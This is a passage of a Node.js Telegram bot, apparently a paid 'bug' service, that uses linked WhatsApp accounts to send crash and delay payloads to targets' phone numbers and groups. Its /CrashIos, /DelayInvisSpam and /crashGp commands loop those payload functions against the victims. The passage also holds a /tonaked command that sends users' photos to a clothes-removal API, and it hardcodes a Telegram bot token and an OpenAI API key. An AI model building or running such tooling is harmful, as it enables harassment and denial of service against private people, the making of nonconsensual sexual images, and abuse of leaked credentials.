        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Ui (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;   
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Ui
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Ui
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 2; i++) {
         await LocaXotion(target);
         await sleep(1000);      
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /Ui
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/DelayInvisSpam (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;   
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Invisible
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /DelayInvisSpam
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 3; i++) {
         await Gyxlores(target);   
         await glorymessage(target, cta = true);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /DelayInvisSpam
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Revolution (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;    
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Revolution
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Revolution
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 1; i++) {
         await amountOne(target, true);         
         await sleep(500);
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /Revolution
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/CrashIos (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;    
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /CrashIos
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /CrashIos
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 4; i++) {
         await TrueIos(target);
         await sleep(1000);
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /CrashIos
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});


// -- ( Case Cooldown ) -- \\
const moment = require("moment");
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id; // ambil id pengirim

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
      { parse_mode: "Markdown" }
    );
  }

  const response = setCooldown(match[1]);
  bot.sendMessage(chatId, response);
});


// -- ( Case Add Premium ) -- \\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
   if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "𝙇𝙪 𝙎𝙞𝙖𝙥𝙖 𝙈𝙚𝙠!? 𝙂𝙖 𝘼𝙙𝙖 𝙃𝙖𝙠 𝘽𝙪𝙖𝙩 𝙈𝙖𝙠𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙄𝙣𝙞×͜×");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});


// -- ( Case List Premium ) -- \\
bot.onText(/^\/listprem$/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});


// -- ( Plungins / Case ) -- \\

// - ( Case Add Owner ) - \\
bot.onText(/^\/addowner(?:\s(.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addowner 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addowner 6843967527."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});


// -- ( Case Delete Premium ) -- \\
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
   
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 𝗕𝗮𝗻𝗴𝗸𝗲!?𝗟𝘂 𝗦𝗶𝗮𝗽𝗮?.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 𝗢𝗶 𝗛𝗶𝘁𝗮𝗺!? 𝗦𝗮𝗹𝗮𝗵 𝗜𝗻𝗽𝘂𝘁 𝗬𝗮𝗻𝗴 𝗕𝗲𝗻𝗲𝗿 /𝗱𝗲𝗹𝗽𝗿𝗲𝗺 (𝗶𝗱)");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 𝗡𝗴𝗲𝘁𝗶𝗸 𝗬𝗮𝗻𝗴 𝗕𝗲𝗻𝗲𝗿 𝗖𝗼𝗸!? 𝗣𝗮𝗸𝗲 𝗔𝗻𝗴𝗸𝗮");
    }

  
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 𝗕𝘂𝘁𝗼 𝗜𝗷𝗼 ${userId} 𝗴𝗮𝗸 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗮𝗹𝗮𝗺 𝗽𝗿𝗲𝗺𝗶𝘂𝗺`);
    }

  
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});


// -- ( Case Delete Owner ) -- \\
bot.onText(/^\/delowner(?:\s(\d+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /delowner 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /delowner 6843967527."
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});

// -- ( Case List Sender ) -- \\
bot.onText(/^\/listsender$/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (sessions.size === 0) {
        return bot.sendMessage(chatId, "```❌\nNo WhatsApp bots connected. Please connect a bot first with /addsender```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    let botList = "```X-demonz\n";
    let index = 1;
    for (const [botNumber, sock] of sessions.entries()) {
        const status = sock.user ? "✅" : "❌";
        botList += `▢ ${index} : ${botNumber}\n`;
        botList += `▢ Status : ${status}\n`;
        index++;
    }
    botList += `▢ Total : ${sessions.size}\n`;
    botList += "```";
    await bot.sendMessage(chatId, botList, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
});


// -- ( Case Add Sender ) -- \\
bot.onText(/^\/addsender(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❗️ Wrong usage:\n`/addsender 62xxxxxxxxxx`", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (botNumber.length < 10) {
        return bot.sendMessage(chatId, "❗️Invalid number.");
    }
    try {
        await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in /addsender:", error);
        bot.sendMessage(chatId, "⚠️ Error connecting to WhatsApp. Please try again.");
    }
});


/// ---- ( Tools Case ) ---- \\\
bot.onText(/^\/tonaked$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;
  let imageUrl = null;

  // Jika command direply ke foto
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const file = await bot.getFile(fileId);
    imageUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '⚠️ Reply ke foto untuk memproses gambar.');
  }

  // Kirim pesan status
  const statusMsg = await bot.sendMessage(chatId, '⏳ Memproses gambar...');

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ Gagal memproses gambar. Pastikan URL atau foto valid.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    // Hapus pesan status
    await bot.deleteMessage(chatId, statusMsg.message_id);

    // Kirim hasil foto
    await bot.sendPhoto(chatId, hasil, { caption: '✅ Berhasil diproses!' });

  } catch (err) {
    console.error(err);
    await bot.editMessageText('❌ Terjadi kesalahan saat memproses gambar.', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});


// -- ( Konfigurasi ) -- \\
const TOKEN = "8491305008:AAErzXCpw7e_STf6mEX6KvaVTJuPUXWDIKQ";
const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });

// -- ( Case /FixCode ) -- \\
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ Syntax Error!\n\nGunakan:\n/fixcode <penjelasan>\nBalas ke pesan berisi kode atau file.\n\nContoh:\n/fixcode perbaiki syntax error\n\n© 𖣂Majesty's VrlTeam. ϟ"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    // === Jika reply file dokumen ===
    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      // Deteksi bahasa dari ekstensi
      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ Balas ke pesan teks atau file kode.");
    }

    // === Mulai proses ===
    await bot.sendMessage(chatId, "🛠️ Sedang memperbaiki kode...");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>༑ᐧ 𖣂 Majesty's 𖣂 ༑ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

© 𖣂Majesty's VrlTeam. ϟ
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    // === Simpan kode ke file sementara ===
    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    // === Kirim file hasil ===
    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    // === Hapus file sementara ===
    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});


// === Fungsi bantu ===
const streamToBuffer = async (stream) => {
  const chunks = [];
  for await (const chunk of stream) chunks.push(chunk);
  return Buffer.concat(chunks);
};

async function deployToVercel() {
  try {
    const response = await axios.post(
      "https://api.vercel.com/v13/deployments",
      {
        name: "my-vercel-deploy",
        gitSource: {
          type: "github",
          repoId: "xzellxopz/my-project", // Ganti sesuai GitHub repo kamu
        },
      },
      {
        headers: {
          Authorization: `Bearer ${process.env.VERCEL_TOKEN}`,
          "Content-Type": "application/json",
        },
      }
    );

    return `✅ Deploy berhasil!\nURL: ${response.data.url}`;
  } catch (error) {
    console.error(error.response?.data || error.message);
    return `❌ Gagal deploy: ${error.response?.data?.error?.message || error.message}`;
  }
}

bot.onText(/\/crashGp(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /crashGp <jid>
│ Contoh: /crashGp 12022991xxxx@g.us
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@g.us`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 10; i++) {
      await crashGP(sock, jid);

    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in crashGp:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

// === Command /deployvercel ===
bot.onText(/^\/deployvercel(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const senderId = msg.from.id;
  const domainName = match[1];
  if (shouldIgnoreMessage(msg)) return;
  
  // ==== CEK PREMIUM ====
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫 Fitur ini hanya untuk pengguna premium.");
  }

  // ==== CEK REPLY DAN FILE ====
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "❌ Harap reply pesan yang berisi file HTML dengan perintah ini."
    );
  }

  if (!domainName) {
    return bot.sendMessage(
      chatId,
      "❌ Harap sertakan nama domain. Contoh:\n`/deployvercel mywebsite`",
      { parse_mode: "Markdown" }
    );
  }

  const fileId = msg.reply_to_message.document.file_id;

  try {
    await bot.sendMessage(chatId, "⏳ Sedang memproses deploy ke Vercel...");
   
    // === Dapatkan link file ===
    const result = await deployToVercel();
    bot.sendMessage(chatId, result);
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

    // === Download file ===
